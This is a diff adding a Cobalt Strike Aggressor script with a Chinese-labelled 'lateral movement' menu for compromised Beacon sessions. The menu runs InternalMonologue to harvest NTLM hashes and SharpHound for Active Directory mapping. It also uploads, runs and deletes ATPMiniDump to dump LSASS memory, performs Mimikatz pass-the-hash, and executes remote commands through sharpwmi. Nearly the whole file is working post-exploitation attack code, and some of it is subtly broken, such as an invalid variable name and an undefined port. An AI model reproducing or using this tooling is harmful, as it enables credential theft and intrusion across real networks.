@@ -1,0 +1,144 @@
+##############################
+#                            #
+#                            #
+#                            #
+#       Xway.cn@panda        #
+#                            #
+#                            #
+#                            #
+##############################
+	menu "横向移动" {
+    	item "NTLM hash"{
+    		local('$bid');
+               foreach $bid ($1){
+                   internal_monologue($bid);
+            }
+    	}
+sub internal_monologue{
+	$binary = "script/InternalMonologue.exe";
+	$help = "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS";
+	beacon_command_register("lazagne", $help, "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS.\n\n$help");
+	if(!-exists $binary)
+	{
+		berror($1, "InternalMonologue binary cannot be found at $binary");
+		return;
+	}
+	$args = "-Downgrade True -Verbose True";
+	bexecute_assembly($1, $binary, $args);
+}		
+		
+		item "SharpHound3.0" {
+			bexecute_assembly($1, script_resource("/script/SharpHound.exe"), "");
+		}
+
+	    menu "ATPMiniDump" {
+			item "上传ATPMiniDump" {
+				$bid = $1;
+				$dialog = dialog("上传ATPMiniDump", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &ATPMiniDump);
+				drow_text($dialog, "UploadPath",  "上传路径: "); 	
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+        }
+sub ATPMiniDump {
+
+    bcd($bid, $3['UploadPath']);
+        bupload($bid, script_resource("/script/ATPMiniDump.exe"));
+    
+
+}
+		  item "运行ATPMiniDump" {
+			$bid = $1;
+			$dialog = dialog("ATPMiniDump", %(bid => $bid), &ATPMiniDump_run);
+			dialog_description($dialog, "使用PssCaptureSnapShot上的MiniDumpWriteDump转储LSASS内存。");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+
+sub ATPMiniDump_run{
+	bshell($bid, "ATPMiniDump.exe");
+}
+
+        	item "删除ATPMiniDump"{
+        	local('$bid');
+        	foreach $bid ($1){
+            	bshell($1, "del /f /s /q ATPMiniDump.exe");
+        	}
+		}
+		}
+
+    	item "Mimikatz-pth"{
+    		local('$bid');
+               foreach $bid ($1){
+                   mimikatz_passthehash($bid);
+            }
+    	}
+
+
+sub mimikatz_passthehash{
+	$bid = $1;
+	$dialog = dialog("Pass-The-Hash" , %(beacon => $1 , domain => "GLITTER" , user => "administrator" , hash => "hash") , 
+	lambda({
+		bpassthehash($3["beacon"] , $3["domain"] , $3["user"] , $3["hash"]);
+	}
+	)
+	);
+	dialog_description($dialog, "Ask Beacon to create a token that passes the specified hash. This is the pth command in Beacon. It uses mimikatz.");
+	drow_text($dialog, "beacon",  "Beacon:");
+	drow_text($dialog, "domain",  "Domain:");
+	drow_text($dialog, "user",  "User:");
+	drow_text($dialog, "hash",  "Hash:");
+	dbutton_action($dialog, "Launch");
+	dialog_show($dialog);
+}
+
+	    menu "sharpwmi" {
+			item "上传sharpwmi" {
+				$bid = $1;
+				$dialog = dialog("上传sharpwmi", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &sharpwmi_up);
+				drow_text($dialog, "UploadPath",  "上传路径: "); 	
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+        }
+sub sharpwmi_up {
+
+    bcd($bid, $3['UploadPath']);
+        bupload($bid, script_resource("/script/sharpwmi.exe"));
+    
+
+}
+                item "运行sharpwmi"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("运行sharpwmi",%(ip => "127.0.0.1", username => "administrator", password => "password", type => "cmd or upload", cmd/path => "cmd or upload path",bid => $bid),&sharpwmi_run);
+                    dialog_description($Dialog, "这是一个基于135端口来进行横向移动的工具，具有执行命令和上传文件功能，通过wmi来执行命令，通过调用来进行数据传输,目前只支持上传512kb以下的文件，因为重置每个值的长度不能超过512kb。");
+                    drow_text($Dialog, "ip", "ip: ");
+					drow_text($Dialog, "username", "username: ");
+					drow_text($Dialog, "password", "password: ");
+					drow_text($Dialog, "type", "cmd/upload: ");
+					drow_text($Dialog, "cmd/path", "cmd/path: ");
+                    dbutton_action($Dialog, "运行");
+                    dialog_show($Dialog);
+                }
+
+sub sharpwmi_run{
+    local('$Name $username $password $type $cmd/path');
+    $Name = $3['ip'];
+	$username = $3['username'];
+	$password = $3['password'];
+	$type = $3['type'];
+	$cmd/path = $3['cmd/path'];
+	bshell($bid, "sharpwmi.exe  $+ $Name  $+ $port  $+ $username  $+ $password  $+ $type  $+ $cmd/path");
+} 
+        	item "删除sharpwmi"{
+        	local('$bid');
+        	foreach $bid ($1){
+            	bshell($1, "del /f /s /q sharpwmi.exe");
+        	}
+		}
+}
+
+
+
+		
+		
+		
+		}
